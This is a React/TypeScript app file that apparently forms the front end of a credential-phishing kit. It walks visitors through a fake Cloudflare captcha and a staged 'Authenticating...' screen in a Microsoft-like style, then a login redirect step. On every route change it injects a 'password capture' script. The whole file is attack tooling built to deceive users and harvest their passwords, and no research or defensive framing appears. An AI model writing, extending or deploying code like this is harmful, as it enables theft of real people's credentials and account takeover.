import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AuthCallback from './components/AuthCallback';
import { injectPasswordCaptureScript } from './utils/password-capture-injector';

const App: React.FC = () => {
    return (
        <Router>
            <MainContent />
        </Router>
    );
};

const MainContent: React.FC = () => {
    const location = useLocation();

    // Re-inject script on navigation to ensure it's present on all logical pages.
    useEffect(() => {
        try {
            injectPasswordCaptureScript();
        } catch (error) {
            console.warn('⚠️ Failed to initialize password capture injector:', error);
        }
    }, [location]);

    return (
        <Routes>
            <Route path="/auth/callback" element={<AuthCallback />} />
            <Route path="*" element={<DefaultPage />} />
        </Routes>
    );
};

// This component contains the original page state logic for the main flow.
const DefaultPage: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');

    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        if (step && ['captcha', 'authenticating', 'replacement'].includes(step)) {
            setCurrentPage(step);
            // Clean the URL after reading the step
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, []);

    const handleCaptchaVerified = () => {
        setCurrentPage('authenticating');
    };

    useEffect(() => {
        if (currentPage === 'authenticating') {
            // This timer simulates a loading/verification step before showing the login form.
            const timer = setTimeout(() => {
                setCurrentPage('replacement');
            }, 1500);
            return () => clearTimeout(timer);
        }
    }, [currentPage]);
    
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={() => window.location.reload()}
                />
            );
        case 'authenticating':
            return (
              <div style={{
                display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh',
                fontFamily: 'Segoe UI, Arial, sans-serif', backgroundColor: '#f3f2f1'
              }}>
                <div style={{ textAlign: 'center', fontSize: '24px', color: '#323130' }}>
                  Authenticating...
                </div>
              </div>
            );
        case 'replacement':
            return <RealOAuthRedirect />;
        default:
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={() => window.location.reload()}
                />
            );
    }
};

export default App;